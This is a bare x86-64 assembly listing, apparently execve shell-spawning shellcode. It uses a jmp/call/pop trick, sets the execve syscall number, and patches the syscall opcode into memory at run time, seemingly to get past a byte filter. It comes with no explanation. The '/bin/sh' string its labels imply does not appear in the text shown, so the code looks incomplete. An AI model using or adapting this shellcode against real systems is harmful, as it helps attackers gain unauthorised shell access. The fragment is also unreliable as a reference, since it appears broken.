jmp binsh
back:
xor rax, rax
mov al, 0x3b
pop rdi
xor rsi, rsi
xor rdx,rdx
xor ebx, ebx
mov ebx, 0x50e
add ebx, 0x1
mov [rip], ebx
nop
nop
nop
nop
nop
nop
nop
nop

binsh:
call back

